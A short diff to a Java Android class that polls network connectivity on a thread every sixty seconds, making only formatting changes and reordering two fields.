@@ -20,16 +20,17 @@ import com.android.syssetup.util.Check;
 
 // Falso broadcast, e' generato da noi
 public class BroadcastMonitorConnectivity extends Thread {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "BroadcastMonitorConnectivity"; //$NON-NLS-1$
-
-	private boolean stop;
 	private final int period;
+	private boolean stop;
 
 	public BroadcastMonitorConnectivity() {
 		stop = false;
 		period = 60000; // Poll interval
-		
+
 		if (Cfg.DEBUG) {
 			setName(getClass().getSimpleName());
 		}
